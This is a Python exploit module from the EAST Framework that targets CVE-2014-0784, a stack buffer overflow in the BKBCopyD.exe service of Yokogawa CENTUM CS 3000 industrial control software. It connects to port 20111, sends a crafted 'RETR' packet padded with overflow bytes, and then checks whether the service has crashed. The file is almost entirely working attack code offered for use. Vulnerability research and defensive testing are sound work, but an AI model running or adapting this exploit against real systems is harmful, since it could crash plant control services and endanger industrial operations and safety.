#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import socket

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_yokogawa_centon_bkbdcopyd_bof"
INFO['DESCRIPTION'] = "Yokogawa CENTUM CS 3000 BKBCopyD.exe Buffer Overflow"
INFO['VENDOR'] = "http://www.yokogawa.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = 'https://www.exploit-db.com/exploits/32210/'
INFO["CVE Name"] = "2014-0784"
INFO["NOTES"] = """
    This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability
        exists in the service BKBCopyD.exe when handling specially crafted packets. This module has
        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3.
    """

INFO['CHANGELOG'] = "23 Nov, 2015. Written by Gleg team."
INFO['PATH'] = 'Exploits/DoS/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = 20111
        self.ssl = None
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        return
        
    def chk(self):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.host, self.port))
        except:
            self.log("check reported no open socket")
            return 1
        self.log("check reported that service is steel alive")
        return 0
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        try:
            s = socket.socket()
            s.connect((self.host, self.port))
            
            data = "RETR "
            data += 'A' * 123
            data += '\xF4\xF4\xF4\xF4'
            data += "\n"
            self.log('Sending data ...')
            s.sendall(data)
                
            s.close()
            time.sleep(3)
            if self.chk():
                self.finish(True)
                return 1
            else:
                self.finish(False)
                return 0
        except:
            self.log("failed!")
            self.finish(False)
            return 0
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
